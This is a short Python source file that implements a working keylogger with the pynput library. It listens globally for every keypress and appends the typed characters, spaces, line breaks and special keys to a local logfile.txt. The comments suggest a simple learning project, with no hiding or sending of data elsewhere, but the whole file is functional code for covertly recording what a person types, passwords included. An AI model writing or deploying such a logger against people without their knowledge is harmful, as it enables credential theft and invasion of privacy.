#Derik Colucci

from pynput import keyboard


def keyLogs(runningLog):
    with open("logfile.txt", 'a') as keylog:
        keylog.write(runningLog)

def keyPressed(key):    
    runningLog = "" #initializing the string for the user input
    #logLength = len(runningLog) #for testing purposes
    try:    
        if hasattr(key, 'char') and key.char is not None: #used to make sure the key is entered and is a char
            runningLog += key.char
        elif key == keyboard.Key.space: #used for easier reading in output file
             runningLog += " "
        elif key == keyboard.Key.backspace: #attempt to simply output file by removing the letters and not adding visiual clutter to file with "key.backspace"
             #runningLog += runningLog[:-1] this does not work while the output file is being appended
             runningLog += str({key}) #will have to create a seperate function to read the data from the export file to make the readability better
        elif key == keyboard.Key.enter:
             runningLog += "\n"
        else:
            runningLog += f"[{key}]"

        keyLogs(runningLog) #call the function for each keypress
        #return runningLog

    except Exception as error:
        print(f"Error: {error}")



if __name__ == "__main__":
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()